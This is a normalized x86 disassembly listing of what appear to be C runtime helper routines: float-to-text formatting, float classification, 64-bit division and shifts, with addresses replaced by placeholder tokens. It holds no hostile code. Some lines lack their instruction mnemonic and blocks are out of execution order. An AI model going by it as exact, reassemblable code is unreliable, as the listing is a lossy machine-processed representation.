mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_1001e3f0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov ebx eax
mov esi [ ebx + 0x4 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_1000afe5
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_1000e8db
push 0x16
pop esi
mov [ eax ] esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000e873
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebx ] 0x2d
mov esi edi
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
xor eax eax
cmp [ ebx ] 0x2d
sete al
add eax esi
add eax edi
mov [ eax ] 0x30
mov [ eax + 0x1 ] 0x0
add esi eax
mov eax esi
call sub_1001ddd9
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_1001ddd9
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov ebx [ ebx + 0x4 ]
inc esi
test ebx ebx
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] ebx
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax esi
call sub_1001ddd9
push edi
push 0x30
push esi
call sub_1000b660
add esp 0xc
sub_1001e4e7
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1001eae9
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1000e873
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push ebx
push esi
push [ ebp + 0x10 ]
mov ecx edi
call sub_1001e3f0
add esp 0x10
mov [ edi ] bl
jmp r-xdata
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_1001e96d
add esp 0x10
cmp eax ebx
je r-xdata
sub_1001e5a2
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1001eae9
xor ebx ebx
add esp 0x14
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] edi
call sub_1000e873
add esp 0x14
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x30 ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_1001e96d
add esp 0x10
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1001de1e
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
cmp cl bl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_1001e3f0
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] bl
sub_1001e69c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001df8d
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001e4e7
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001e07d
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001e5a2
jmp r-xdata
sub_1001e724
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001e69c
add esp 0x1c
pop ebp
retn
sub_1001e747
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_1001ec7f
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_1000e74b
add esp 0x14
sub_1001e772
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fdiv [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fld1
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_1001e7b0
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_1001e772
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_1001e7f0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_1001e81d
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_1000afe5
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1001f773
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_1001eceb
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
sub_1001e8c5
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_1000afe5
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1001f773
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_1001f22f
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
sub_1001e96d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ecx + 0xc ]
cmp esi ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
call sub_1000e8db
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
cmp edx ebx
mov [ esi ] bl
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov eax edx
jmp r-xdata
cmp edx ebx
mov [ esi ] 0x30
lea eax [ esi + 0x1 ]
jle r-xdata
call sub_1000e8db
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
cmp edx ebx
mov [ eax ] bl
jl r-xdata
mov cl [ edi ]
cmp cl bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000e873
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc edi
jmp r-xdata
lea edi [ esi + 0x1 ]
push edi
call sub_1000b9b0
inc eax
push eax
push edi
push esi
call sub_10019bd0
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
cmp edx ebx
jg r-xdata
xor eax eax
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_1001ea2c
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x6 ]
push ebx
mov ecx eax
push esi
push edi
shr ecx 0x4
and eax 0x8000
mov edi 0x7ff
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test ebx ebx
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
add ecx 0x3c01
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ecx 0x3c00
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
add edx edx
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
movzx edi cx
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_1001eae9
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x30 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1001ea2c
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_1001fe6b
mov esi [ ebp - 0x30 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ ebx ] eax
movsx eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_1001479b
add esp 0x24
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000e74b
add esp 0x14
sub_1001eb80
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_1001ec60
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_1001ec7f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
test ecx 0xfcf0fce0
je r-xdata
mov esi [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
je r-xdata
call sub_100208bd
call sub_100208bd
mov [ esi ] eax
jmp r-xdata
call sub_1000e8db
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_1000e873
add esp 0x14
mov eax edi
pop edi
jmp r-xdata
push esi
push esi
call sub_100208bd
pop ecx
pop ecx
mov [ edi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_1001eceb
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
